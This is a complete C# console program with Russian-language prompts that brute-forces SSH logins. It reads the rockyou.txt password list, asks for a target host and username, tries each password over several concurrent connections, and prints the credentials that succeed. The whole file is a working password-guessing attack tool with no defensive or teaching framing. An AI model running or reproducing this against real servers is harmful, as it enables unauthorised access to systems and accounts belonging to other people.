using System;
using Renci.SshNet;
using System.Text;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using System.Threading;

class Program
{
    static async Task Main()
    {

        string filePath = "rockyou.txt";

        if (!File.Exists(filePath))
        {
            Console.WriteLine("Файл словаря не найден.");
            return;
        }

        
        List<string> dictionary = File.ReadAllLines(filePath).ToList();

        Console.Clear();
        Console.BackgroundColor = ConsoleColor.Blue;
        Console.ForegroundColor = ConsoleColor.White;
        Console.Write("Введите IP адрес или домен: ");
        string host = Console.ReadLine();

        Console.Write("Введите имя пользователя: ");
        string username = Console.ReadLine();

        int maxThreads = 5;
        var semaphore = new SemaphoreSlim(maxThreads);
        bool found = false;
        var tasks = new List<Task>();

        foreach (string password in dictionary)
        {

            if (found)
                break;
            
            if (string.IsNullOrWhiteSpace(password))
                continue;
            
            await semaphore.WaitAsync();

            var task = Task.Run(() =>
            {
                
                try
                {
                    Console.WriteLine(password);
                    if (found)
                        return;
                    
                    using (var client = new SshClient(host, username, password))
                    {
                        client.Connect();
                        if (client.IsConnected && !found)
                        {
                            found = true;                            
                            client.Disconnect();
                            Thread.Sleep(500);
                            Console.BackgroundColor = ConsoleColor.Green;
                            Console.WriteLine("\nПодключение успешно!");
                            Console.WriteLine($"\nIP адрес или домен:{host}");
                            Console.WriteLine($"\nИмя пользователя:{username}");
                            Console.WriteLine($"\nПароль:{password}");        
                        }
                        else
                        {
                            Console.WriteLine("Не удалось подключиться.");
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Ошибка: " + ex.Message);
                }
                finally
                {
                    semaphore.Release();
                }  
            });
            tasks.Add(task);
        }

        await Task.WhenAll(tasks);

        Console.BackgroundColor = ConsoleColor.Blue;
        Console.WriteLine("\nНажмите любую клавишу для выхода...");
        Console.ReadKey();
        Console.BackgroundColor = ConsoleColor.Black;
    }
}   